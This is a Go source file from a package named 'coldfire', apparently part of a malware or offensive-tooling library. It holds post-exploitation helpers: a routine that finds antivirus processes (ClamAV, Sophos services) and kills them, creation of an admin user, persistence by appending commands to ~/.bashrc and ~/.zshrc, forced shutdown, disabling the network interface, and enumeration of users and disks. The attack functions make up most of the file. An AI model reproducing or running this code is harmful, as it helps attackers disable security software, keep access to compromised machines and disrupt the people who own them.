package coldfire

import (
	"strings"
	"strconv"
	"fmt"
	"os"
	"github.com/mitchellh/go-ps"
)
func info() string {
	user, err := cmdOut("whoami")
	if err != nil {
		return "N/A"
	} else {
		return user
	}

	// o, err := cmdOut("ip r")
	// if err != nil {
	// 	ap_ip = "N/A" // (1)
	// }
	// entries := strings.Split(o, "\n")
	// for e := range entries {
	// 	entry := entries[e]
	// 	if strings.Contains(entry, "default via") {
	// 		ap_ip = strings.Split(o, "")[2] // (1)
	// 	}
	// }

}

func killProcByPID(pid int) error {
	p := strconv.Itoa(pid)
	cmd := "kill -9 " + p
	_, err := cmdOut(cmd)
	return err
}

func isRoot() bool {
	root := true

	u, _ := cmdOut("whoami")
	root = (strings.TrimSuffix(u, "\n") == "root")

	return root
}

func shutdown() error {
	c := "shutdown +1"
	_, err := cmdOut(c)

	return err
}

func pkillAv() error {
	av_processes := []string{"netsafety", "clamav", "sav-protect.service", "sav-rms.service"}

	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if ContainsAny(proc_name, av_processes) {
			err := killProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func users() ([]string, error) {
	o, err := cmdOut("cut -d: -f1 /etc/passwd")

	if err != nil {
		return nil, err
	}

	return strings.Split(o, "\n"), nil
}

func createUser(username, password string) error {
	// This is too much distro dependent. Maybe try x different commands,
	// including `useradd`?
	cmd := f("sysadminctl -addUser %s -password %s -admin", username, password)

	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func wifiDisconnect() error {
	iface, _ := Iface()
	cmd := f("ip link set dev %s down", iface)
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func addPersistentCommand(cmd string) error {
	_, err := cmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
	return err
}

func disks() ([]string, error) {
	found_drives := []string{}

	for _, drive := range "abcdefgh" {
		f, err := os.Open("/dev/sd" + string(drive))
		if err == nil {
			found_drives = append(found_drives, "/dev/sd"+string(drive))
			f.Close()
		}
	}

	return found_drives, nil
}
